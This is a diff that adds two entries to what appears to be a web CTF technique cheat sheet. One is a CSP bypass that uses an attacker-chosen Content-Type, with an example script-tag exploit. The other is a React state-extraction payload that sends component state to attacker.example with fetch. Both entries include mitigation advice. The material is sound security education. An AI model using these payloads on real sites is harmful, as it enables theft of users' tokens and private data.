@@ -20,6 +20,8 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [Java hashCode() Collision for Auth Bypass (CSAW 2017)](#java-hashcode-collision-for-auth-bypass-csaw-2017)
 - [CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)](#css-font-face-unicode-range-data-exfiltration-harekaze-ctf-2018)
 - [postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)](#postmessage-null-origin-bypass-via-data-uri-iframe-backdoorctf-2018)
+- [CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)](#csp-bypass-via-attacker-controlled-mime-type-for-same-origin-scripts-midnight-sun-ctf-finals-2018)
+- [React Component State Extraction via __reactInternalInstance$ (RCTF 2018)](#react-component-state-extraction-via-__reactinternalinstance-rctf-2018)
 
 ---
 
@@ -651,3 +653,44 @@ setTimeout(function(){
 ```
 
 **Key insight:** `data:` URI iframes have a `null` origin. Many postMessage handlers check `event.origin !== expected` but don't account for null origins, allowing injection from a sandboxed context. The `sandbox` attribute without `allow-same-origin` also produces a `null` origin. Always test postMessage handlers with `null` origin by using `data:` URIs or sandboxed iframes. The fix is to explicitly reject `null` and empty origins: `if (!event.origin || event.origin === 'null') return;`.
+
+---
+
+## CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)
+
+**Pattern (Mimisbrunnr):** Endpoint `/xss?xss=<payload>&mimis=<mime>` echoes `payload` with an attacker-chosen `Content-Type`. CSP is `script-src 'self'` and `X-Content-Type-Options: nosniff` is set, so normal XSS injection is blocked. But by choosing `mimis=application/javascript` (or Chrome's permissive `jscript`), the same-origin response becomes loadable as a script via `<script src="/xss?...&mimis=jscript">`.
+
+**Exploit:**
+```html
+<!-- Served by attacker's XSS injection point (another endpoint on the same origin) -->
+<script src="/xss?xss=function%20WELCOME(){};var%20oooooo=0;/*&mimis=jscript"></script>
+<script src="/xss?xss=*/payload;//&mimis=jscript"></script>
+```
+- The first request smuggles harmless tokens that also open a block comment (`/*`).
+- The second request closes the comment (`*/`) and runs the real payload.
+- Because both responses come from `self`, `script-src 'self'` is satisfied even though the browser would normally have rejected them for having a different Content-Type without `nosniff`.
+
+**Key insight:** `X-Content-Type-Options: nosniff` stops MIME sniffing, but it does not override a Content-Type that the server itself declares. Any endpoint whose response type is attacker-controlled — even indirectly, via a query param or `Accept` header — is effectively a script gadget under `script-src 'self'`. Block this by hard-coding the `Content-Type` for reflected endpoints and never echoing user input into headers.
+
+**References:** Midnight Sun CTF Finals 2018 — writeup 10258
+
+---
+
+## React Component State Extraction via __reactInternalInstance$ (RCTF 2018)
+
+**Pattern:** XSS on a React-rendered page cannot directly read server-side state, but every DOM node managed by React carries a property named `__reactInternalInstance$<random>` that links back to the React Fiber node. From there, `.return.stateNode.state` (or `.memoizedState` in newer versions) exposes component state that was never serialized into HTML.
+
+**Exfiltration payload:**
+```javascript
+const key = Object.keys(document.querySelector('[data-react-root]'))
+  .find(k => k.startsWith('__reactInternalInstance$'));
+const fiber = document.querySelector('[data-react-root]')[key];
+const state = fiber.return.stateNode.state;
+fetch('https://attacker.example/log?s=' + encodeURIComponent(JSON.stringify(state)));
+```
+
+For React 17+ the property name is `__reactFiber$<random>`, and the path is `.stateNode.memoizedState`. Walk `.return` until you hit a node with `stateNode !== null`.
+
+**Key insight:** React stores component state on the DOM itself for hot-reload and devtools support. XSS within the same document therefore has full read access to props and state, including values that were fetched client-side and never echoed into the markup (auth tokens, private chats, admin panels). Harden dev builds by stripping `__reactFiber$`/`__reactInternalInstance$` attachments in production or by preventing XSS upstream — CSP alone is not enough because the state read happens in JavaScript that CSP already permits.
+
+**References:** RCTF 2018 — writeup 10125
